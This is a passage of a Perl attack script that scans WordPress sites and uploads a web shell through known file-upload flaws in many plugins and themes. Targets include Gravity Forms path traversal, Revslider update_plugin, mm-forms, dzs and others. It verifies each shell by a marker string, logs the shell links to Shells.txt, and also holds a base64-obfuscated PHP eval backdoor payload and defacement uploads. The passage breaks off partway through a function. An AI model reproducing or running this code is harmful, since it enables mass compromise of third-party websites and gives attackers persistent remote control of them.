print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"yass";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ homepageslideshow #####################
sub homepage(){

my $url = "$site/wp-admin/admin.php?page=homepageslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'hss_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/homepageslideshow\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/homepageslideshow/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageslideshow";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageslideshow";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ image-news-slider #####################
sub ipage(){

my $url = "$site/wp-admin/admin.php?page=image-news-slider_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'slider_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/image-news-slider\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/image-news-slider/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"image-news-slider";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"image-news-slider";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Bliss-slider #####################
sub bliss(){

my $url = "$site/wp-admin/admin.php?page=unique_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'uni_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/unique\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/unique/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"bliss-news-slider";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $levoslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"bliss-news-slider";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ xdata-toolkit #####################
sub xdata(){

my $url = "$site/wp-content/plugins/xdata-toolkit/modules/TransformStudio/SaveTransformUpdateView.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => ["xsldata" => '<? xml version = "1.0"?><xsl: stylesheet version = "1.0" xmlns: xsl = "http://www.w3.org/1999/XSL/Transform"><xsl:template match ="/"><html></html></xsl:template></xsl:stylesheet>',e_transform_file => ["tool/priv.php"],]);

$cherryup="$site/wp-content/plugins/xdata-toolkit/transforms/client/priv.php?c=izo";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"xdata-toolkit";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $cherryup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"xdata-toolkit";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/priv.php?c=izo";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ foxcontact #####################
sub wofind(){


$foxup="$site/wp-content/plugins/woocommerce-products-filter/languages/woocommerce-products-filter-en_US.po";

my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /plugin_options.php/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"products-filter";
print color('bold white')," ---> ";
print color('bold green'),"FOUND\n";
open (TEXT, '>>woocommerce-products-filter.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"products-filter";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ m-forms-community #####################
sub mms(){ 
my $url = "$site/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["tool/priv.php"] ]);

if ($response->content =~ /filename: '(.*?)'/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/plugins/mm-forms-community/upload/temp/$uploadfolder";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"mm-forms com";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
mmsdef();
}
}
sub mmsdef(){ 
my $url = "$site/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'fileToUpload' => ["tool/izo.html"] ]);

if ($response->content =~ /filename: '(.*?)'/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/plugins/mm-forms-community/upload/temp/$uploadfolder";
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"mm-forms com";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"mm-forms com";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
sub xxsav(){ 
my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["tool/priv.php"]]);

$zoomerup="$site//wp-content/plugins/developer-tools/libs/priv.php?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

sub xxsd(){ 
my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["tool/priv.php"]]);

$zoomerup="$site//wp-content/uploads/favicon/priv.php?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

sub at1(){ 
my $url = "$site/wp-content/plugins/dzs-portfolio/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["tool/priv.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-portfolio/upload/priv.PhP.txtx?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
att1();
}
}
sub att1(){ 
my $url = "$site/wp-content/plugins/dzs-portfolio/admin/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["tool/priv.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-portfolio/upload/admin/priv.PhP.txtx?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-portfolio";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

sub at2(){ 
my $url = "$site/wp-content/plugins/dzs-videogallery/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["tool/priv.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-videogallery/upload/priv.PhP.txtx?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
at3();
}
}
sub at3(){ 
my $url = "$site/wp-content/plugins/dzs-videogallery/admin/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'file_field' => ["tool/priv.PhP.txtx"] ]);

$zoomerup="$site/wp-content/plugins/dzs-videogallery/admin/upload/priv.PhP.txtx?c=izo";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-videogallery";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["tool/BackDoor.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php5"]);

$gravityformsup = "$site/wp-content/uploads/_input_3_css.php5?c=izo";
my $checkk = $ua->get("$site/wp-content/uploads/_input_3_css.php5?c=izo")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
threads->exit();
}
else{
gravityforms1();
}
}
sub gravityforms1(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["tool/BackDoor.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.phtml"]);

$gravityformsup = "$site/wp-content/uploads/_input_3_css.phtml?c=izo";
my $checkk = $ua->get("$site/wp-content/uploads/_input_3_css.phtml?c=izo")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
threads->exit();
}
else{
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["tool/index.jpg"], form_id => '1', name => 'izo.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_izo.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /izocin/) {

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green'),"  [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold red'),"Shell Not Uploaded\n";
print color('bold green'),"  [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"[Link] => $gravityformsupp\n";
open (TEXT, '>>index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);

}
else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ Gravity Forms #####################
sub gravityformsb(){
my $indexa='<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>&field_id=3&form_id=1&gform_unique_id=../../../../uploads/gravity_forms/&name=izo.phtml';
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "multipart/form-data", Content => $indexa);

$gravityformsup = "$site/wp-content/uploads/gravity_forms/_input_3_izo.phtml";
my $checkk = $ua->get("$site/wp-content/uploads/gravity_forms/_input_3_izo.phtml")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity2 Forms";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
threads->exit();
}
else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Gravity2 Forms";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["tool/revslider.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/priv.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/priv.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/priv.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/priv.php")->content;

if($revs =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revavada =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}


elsif($revstriking =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revincredible =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revmedicate =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
